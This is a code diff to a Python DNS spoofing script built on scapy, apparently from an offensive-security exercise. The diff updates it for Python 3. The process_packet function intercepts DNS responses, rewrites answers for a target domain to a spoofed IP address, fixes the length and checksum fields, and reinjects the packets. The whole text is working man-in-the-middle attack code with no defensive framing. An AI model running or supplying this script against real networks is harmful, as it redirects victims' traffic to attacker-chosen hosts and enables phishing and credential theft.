@@ -17,18 +17,19 @@ def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
         qname = scapy_packet[DNSQR].qname
-        if target_dn in qname:
-            print("[+] Spoofing Target: " + qname)
+        if target_dn.encode() in qname:
+            print("[+] Spoofing Target: " + qname.decode())
             answer = DNSRR(rrname=qname, rdata=spoof_ip)
             scapy_packet[DNS].an = answer
             scapy_packet[DNS].ancount = 1
 
             del scapy_packet[IP].len
             del scapy_packet[IP].chksum
-            del scapy_packet[UDP].chksum
-            del scapy_packet[UDP].len
+            if scapy_packet.haslayer(UDP):
+                del scapy_packet[UDP].chksum
+                del scapy_packet[UDP].len
 
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(scapy_packet.build())
 
     packet.accept()
 
